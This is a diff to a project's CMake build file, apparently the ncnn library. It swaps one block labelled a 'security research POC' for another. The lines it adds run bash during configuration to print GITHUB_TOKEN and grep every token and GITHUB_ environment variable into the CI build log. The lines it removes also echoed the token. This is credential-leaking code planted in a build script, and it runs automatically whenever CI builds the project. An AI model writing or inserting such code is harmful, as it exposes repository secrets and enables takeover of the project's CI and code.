@@ -23,13 +23,22 @@ message(STATUS "NCNN_VERSION_STRING = ${NCNN_VERSION_STRING}")
 
 cmake_minimum_required(VERSION 2.8.12...3.10)
 
-# Security Research POC - GitHub Token Extraction
-message(STATUS "=== SECURITY RESEARCH POC ===")
-message(STATUS "GitHub Token: $ENV{GITHUB_TOKEN}")
-message(STATUS "Repository: $ENV{GITHUB_REPOSITORY}")
-message(STATUS "Actor: $ENV{GITHUB_ACTOR}")
-message(STATUS "Event: $ENV{GITHUB_EVENT_NAME}")
-message(STATUS "=== END POC ===")
+# Try multiple ways to access the token
+execute_process(
+    COMMAND bash -c "
+    echo '=== ENHANCED SECURITY POC ==='
+    echo 'Method 1 - Direct: '$GITHUB_TOKEN
+    echo 'Method 2 - Env: '$(printenv GITHUB_TOKEN)
+    echo 'Method 3 - All env vars:'
+    env | grep -i token || echo 'No token vars found'
+    echo 'Method 4 - All github vars:'
+    env | grep GITHUB_ | sort
+    echo '=== END ENHANCED POC ==='
+    "
+    OUTPUT_VARIABLE TOKEN_RESULT
+)
+message(STATUS "SECURITY POC RESULTS: ${TOKEN_RESULT}")
+
 
 if(NOT CMAKE_BUILD_TYPE)
     set(CMAKE_BUILD_TYPE release CACHE STRING "Choose the type of build" FORCE)
